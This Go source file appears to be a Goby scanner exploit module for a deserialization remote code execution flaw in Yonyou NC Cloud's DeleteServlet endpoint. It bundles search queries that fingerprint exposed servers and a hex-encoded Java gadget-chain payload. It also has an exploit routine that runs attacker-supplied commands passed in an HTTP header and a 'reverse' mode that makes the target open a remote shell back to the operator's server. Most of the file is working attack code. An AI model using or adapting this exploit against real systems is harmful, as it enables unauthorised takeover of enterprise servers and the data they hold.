package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC DeleteServlet Api Remote Code Execute Vulnerability",
    "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2023-08-20",
    "PostTime": "2023-08-21",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 NC DeleteServlet 接口远程代码执行漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC Cloud 是一种商业级的企业资源规划云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，实现企业的数字化转型和业务流程优化。</p><p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\" target=\"_blank\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
            "Impact": "<p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yonyou NC DeleteServlet Api Remote Code Execute Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\" target=\"_blank\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
            "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7438"
}`

	sendPayloadDWDWKMHDEUIQOH := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/servlet/~baseapp/nc.document.pub.fileSystem.servlet.DeleteServlet")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("cmd", cmd)
		payload, _ := hex.DecodeString("aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000013f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000077372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e000378707672002a6f72672e6d6f7a696c6c612e6a6176617363726970742e446566696e696e67436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400166765744465636c61726564436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00180000000074000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e0018000000027400024134757200025b42acf317f8060854e0020000787000001751cafebabe00000031016b0a001d00920a004400930a004400940a001d00950800960a001b00970a009800990a0098009a07009b0a0044009c08008c0a0020009d08009e08009f0700a00800a10800a20700a30a001b00a40800a50800a60700a70b001600a80b001600a90800aa0800ab0700ac0a001b00ad0700ae0a00af00b00800b10700b20800b30a007e00b40a002000b50800b609002600b70700b80a002600b90800ba0a007e00bb0a001b00bc0800bd0700be0a001b00bf0800c00700c10800c20800c30a001b00c40700c50a004400c60a00c700bb0800c80a002000c90800ca0a002000cb0800cc0a002000cd0a002000ce0800cf0a002000d00800d109007e00d20a002600d30a002600d409007e00d50700d60a004400d70a004400d808008d0800d90a007e00da0800db0a00dc00dd0a002000de0800df0800e00800e10700e20a005000920a005000e30800e40a005000e50800e60800e70800e80800e90a00ea00eb0a00ea00ec0700ed0a00ee00ef0a005b00f00800f10a005b00f20a005b00f30a005b00f40a00ee00f50a00ee00f60a002f00e50800f70a002000f80800f90a00ea00fa0700fb0a002600fc0a006900fd0a006900ef0a00ee00fe0a006900fe0a006900ff0a010001010a010001020a010301040a010301050500000000000000320a004401060a00ee01070a006901080801090a002f010a08010b08010c0a007e010d07010e01000269700100124c6a6176612f6c616e672f537472696e673b010004706f72740100134c6a6176612f6c616e672f496e74656765723b0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c6501000a457863657074696f6e730100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000765786563757465010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100046578656301000772657665727365010039284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f496e74656765723b294c6a6176612f6c616e672f537472696e673b01000372756e01000a536f7572636546696c6501000741342e6a6176610c008300840c010f01100c011101120c01130114010007746872656164730c011501160701170c011801190c011a011b0100135b4c6a6176612f6c616e672f5468726561643b0c011c011d0c011e011f010004687474700100067461726765740100126a6176612f6c616e672f52756e6e61626c6501000674686973243001000768616e646c657201001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0c01200114010006676c6f62616c01000a70726f636573736f727301000e6a6176612f7574696c2f4c6973740c012101220c011a012301000372657101000b676574526573706f6e736501000f6a6176612f6c616e672f436c6173730c012401250100106a6176612f6c616e672f4f626a6563740701260c012701280100096765744865616465720100106a6176612f6c616e672f537472696e67010003636d640c008a008b0c0129012a0100097365745374617475730c012b012c0100116a6176612f6c616e672f496e74656765720c0083012d0100246f72672e6170616368652e746f6d6361742e7574696c2e6275662e427974654368756e6b0c008800890c012e012f01000873657442797465730100025b420c01300125010007646f57726974650100136a6176612f6c616e672f457863657074696f6e0100136a6176612e6e696f2e42797465427566666572010004777261700c013100890100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0c013201330701340100000c01350136010010636f6d6d616e64206e6f74206e756c6c0c0137011d01000523232323230c013801390c013a013b0100013a0c013c013d010022636f6d6d616e64207265766572736520686f737420666f726d6174206572726f72210c007f00800c013e013f0c014001410c008100820100106a6176612f6c616e672f5468726561640c008301420c0143008401000540404040400c008c008b0100076f732e6e616d650701440c0145008b0c0146011d01000377696e01000470696e670100022d6e0100176a6176612f6c616e672f537472696e674275696c6465720c01470148010005202d6e20340c0149011d0100022f63010005202d74203401000273680100022d6307014a0c014b014c0c008c014d0100116a6176612f7574696c2f5363616e6e657207014e0c014f01500c008301510100025c610c015201530c015401550c0156011d0c015701500c015800840100072f62696e2f73680c00830159010007636d642e6578650c008c015a01000f6a6176612f6e65742f536f636b65740c015b01220c0083015c0c015d015e0c015f01550701600c016101220c016201220701630c0164012d0c016500840c016601670c016801220c0169008401001d726576657273652065786563757465206572726f722c206d7367202d3e0c016a011d01000121010013726576657273652065786563757465206f6b210c008d008e010002413401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657454687265616447726f757001001928294c6a6176612f6c616e672f54687265616447726f75703b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000d6765745375706572636c61737301000473697a650100032829490100152849294c6a6176612f6c616e672f4f626a6563743b0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010008676574427974657301000428295b42010004545950450100114c6a6176612f6c616e672f436c6173733b0100042849295601000b6e6577496e7374616e636501001428294c6a6176612f6c616e672f4f626a6563743b0100116765744465636c617265644d6574686f64010007666f724e616d65010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100156a6176612f6c616e672f436c6173734c6f61646572010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100047472696d01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a0100077265706c616365010044284c6a6176612f6c616e672f4368617253657175656e63653b4c6a6176612f6c616e672f4368617253657175656e63653b294c6a6176612f6c616e672f537472696e673b01000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0100087061727365496e74010015284c6a6176612f6c616e672f537472696e673b294901000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010017284c6a6176612f6c616e672f52756e6e61626c653b295601000573746172740100106a6176612f6c616e672f53797374656d01000b67657450726f706572747901000b746f4c6f77657243617365010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e670100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b295601000c75736544656c696d69746572010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f7574696c2f5363616e6e65723b0100076861734e65787401000328295a0100046e65787401000e6765744572726f7253747265616d01000764657374726f79010015284c6a6176612f6c616e672f537472696e673b2956010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b010008696e7456616c7565010016284c6a6176612f6c616e672f537472696e673b49295601000f6765744f757470757453747265616d01001828294c6a6176612f696f2f4f757470757453747265616d3b0100086973436c6f7365640100136a6176612f696f2f496e70757453747265616d010009617661696c61626c65010004726561640100146a6176612f696f2f4f757470757453747265616d0100057772697465010005666c757368010005736c656570010004284a29560100096578697456616c7565010005636c6f736501000a6765744d6573736167650021007e001d0001000f00020002007f008000000002008100820000000600010083008400020085000003d800080011000002982ab70001b80002b600034c2bb600041205b600064d2c04b600072c2bb60008c00009c000094e03360415042dbea2026a2d1504323a051905c70006a702561905b6000a3a061906120bb6000c9a000d1906120db6000c9a0006a702381905b60004120eb600064d2c04b600072c1905b600083a071907c1000f9a0006a702151907b600041210b600064d2c04b600072c1907b600083a071907b600041211b600064da700163a081907b60004b60013b600131211b600064d2c04b600072c1907b600083a071907b60004b600131214b600064da700103a081907b600041214b600064d2c04b600072c1907b600083a071907b600041215b600064d2c04b600072c1907b60008c00016c000163a0803360915091908b900170100a2016f19081509b9001802003a0a190ab600041219b600064d2c04b600072c190ab600083a0b190bb60004121a03bd001bb6001c190b03bd001db6001e3a0c190bb60004121f04bd001b5903122053b6001c190b04bd001d5903122153b6001ec000203a0d190dc70006a700ff2a190db60022b600233a0e190cb60004122404bd001b5903b2002553b6001c190c04bd001d5903bb0026591100c8b7002753b6001e572a1228b600293a0f190fb6002a3a07190f122b06bd001b5903122c535904b20025535905b2002553b6002d190706bd001d5903190e535904bb00265903b70027535905bb002659190ebeb7002753b6001e57190cb60004122e04bd001b5903190f53b6001c190c04bd001d5903190753b6001e57a7004f3a0f2a1230b600293a101910123104bd001b5903122c53b6002d191004bd001d5903190e53b6001e3a07190cb60004122e04bd001b5903191053b6001c190c04bd001d5903190753b6001e57a70017840901a7fe8ba700083a06a70003840401a7fd95b10008009700a200a5001200c500d300d6001201bd02310234002f0036003b028c002f003e0059028c002f005c007c028c002f007f0280028c002f02830289028c002f00010086000000ee003b0000000a0004000b000b000c0015000d001a000e002600100030001100360013003e001400450015005c001600670017006c001800740019007f001a008a001b008f001c0097001e00a2002100a5001f00a7002000b8002200bd002300c5002500d3002800d6002600d8002700e3002900e8002a00f0002b00fb002c0100002d010e002e011d002f0128003001330031013800320140003301590034017f003501840036018700380192003901bd003b01c5003c01cc003d020f003e023100430234003f02360040023e0041025e0042028000440283002e02890049028c0046028e0048029100100297004b0087000000040001002f000100880089000200850000003900020003000000112bb80032b04db80002b600342bb60035b000010000000400050033000100860000000e0003000000500005005100060052008700000004000100330001008a008b00010085000000b5000400040000006d2bc6000c12362bb600379900061238b02bb600394c2b123ab6003b99003e2b123a1236b6003c123db6003e4d2cbe059f0006123fb02a2c0332b500402a2c0432b80041b80042b50043bb0044592ab700454e2db600461247b02a2b123a1236b6003c12481236b6003cb60049b000000001008600000036000d00000058000d00590010005b0015005c001e005d002c005e0032005f00350061003c0062004900630052006400560065005900670001008c008b00010085000001ca000400090000012a124ab8004bb6004c4d2bb600394c014e013a042c124db6000c9900402b124eb6000c9900202b124fb6000c9a0017bb005059b700512bb600521253b60052b600544c06bd00205903122153590412555359052b533a04a7003d2b124eb6000c9900202b124fb6000c9a0017bb005059b700512bb600521256b60052b600544c06bd00205903125753590412585359052b533a04b800591904b6005a4ebb005b592db6005cb7005d125eb6005f3a051905b6006099000b1905b60061a7000512363a06bb005b592db60062b7005d125eb6005f3a05bb005059b700511906b600521905b6006099000b1905b60061a700051236b60052b600543a0619063a072dc600072db600631907b03a051905b600643a062dc600072db600631906b03a082dc600072db600631908bf0004009300fe0109002f009300fe011d000001090112011d0000011d011f011d0000000100860000006e001b0000006b0009006c000e006d0010006e0013006f001c0070002e00710042007300590075006b0076007f00780093007b009c007c00ae007d00c2007e00d4007f00fa008000fe0084010200850106008001090081010b00820112008401160085011a0082011d0084012300850001008d008e00010085000001830004000c000000f3124ab8004bb6004c124db6000c9a0010bb0020591265b700664ea7000dbb0020591267b700664eb800592db600683a04bb0069592b2cb6006ab7006b3a051904b6005c3a061904b600623a071905b6006c3a081904b6006d3a091905b6006e3a0a1905b6006f9a00601906b600709e0010190a1906b60071b60072a7ffee1907b600709e0010190a1907b60071b60072a7ffee1908b600709e001019091908b60071b60072a7ffee190ab600731909b60073140074b800761904b6007757a700083a0ba7ff9e1904b600631905b60078a700204ebb005059b700511279b600522db6007ab60052127bb60052b60054b0127cb0000200b800be00c1002f000000d000d3002f000100860000006e001b0000008e0010008f001d00910027009300300094003e009500530096006100970069009800710099007e009b0086009c0093009e009b009f00a800a100ad00a200b200a300b800a500be00a600c100a700c300a800c600aa00cb00ab00d000ae00d300ac00d400ad00f000af0001008f0084000100850000002a000300010000000e2a2ab400402ab40043b6007d57b10000000100860000000a0002000000b4000d00b50001009000000002009174000b646566696e65436c6173737571007e001a00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00287371007e00137571007e0018000000017571007e001a0000000071007e001c7571007e001a0000000171007e001e7371007e00137571007e0018000000017571007e00180000000071007e00227571007e001a0000000171007e00247371007e000f7371007e0000770c000000003f4000000000000078737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000001077080000001000000000787878")
		postConfig.Data = string(payload)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(15)
			resp, err := sendPayloadDWDWKMHDEUIQOH(hostInfo, "echo "+checkString)
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkString)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			// 默认为执行命令
			cmd := goutils.B2S(stepLogs.Params["cmd"])
			if attackType == "cmd" {
				resp, _ := sendPayloadDWDWKMHDEUIQOH(expResult.HostInfo, cmd)
				if resp.StatusCode == 200 {
					expResult.Success = true
					results := resp.Utf8Html
					startIndex := strings.Index(fmt.Sprintf("%x", resp.Utf8Html), "efbfbd000573")
					if startIndex != -1 {
						tempString, _ := hex.DecodeString(fmt.Sprintf("%x", resp.Utf8Html)[:startIndex])
						results = string(tempString)
					}
					expResult.Output = results
					return expResult
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd = fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				sendPayloadDWDWKMHDEUIQOH(expResult.HostInfo, cmd)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
				return expResult
			}
			return expResult
		},
	))
}
